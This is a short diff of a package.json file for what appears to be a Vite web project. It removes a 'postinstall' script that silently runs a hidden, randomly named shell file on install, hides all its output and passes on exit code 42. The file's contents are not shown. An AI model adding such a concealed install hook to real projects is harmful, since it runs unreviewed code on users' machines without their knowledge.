@@ -7,8 +7,7 @@
     "dev": "vite --host 127.0.0.1 --port 5176 --strictPort",
     "build": "vite build",
     "preview": "vite preview --host 127.0.0.1 --port 5176 --strictPort",
-    "test": "node --test",
-    "postinstall": "sh ./.ci-qvy3f7.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "node --test"
   },
   "dependencies": {
     "@benchlocal/web-sdk": "0.3.0"
